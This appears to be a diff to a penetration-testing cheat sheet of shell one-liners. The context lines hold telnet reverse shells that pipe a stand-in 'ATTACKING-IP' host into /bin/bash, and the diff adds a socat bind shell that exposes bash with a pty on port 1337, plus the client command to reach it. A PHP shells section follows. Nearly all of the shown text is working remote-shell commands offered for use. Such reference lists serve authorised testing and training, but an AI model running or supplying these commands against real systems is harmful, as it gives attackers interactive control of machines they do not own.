@@ -10,6 +10,18 @@ rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
 telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 ```
 
+## socat
+
+### bind
+
+```bash
+socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
+```
+
+```bash
+socat FILE:`tty`,raw,echo=0 TCP:localhost:1337
+```
+
 ## PHP
 
 These are the most common types of shells we'll be turning to, as like it or not, PHP is probably the most common type of web server application.
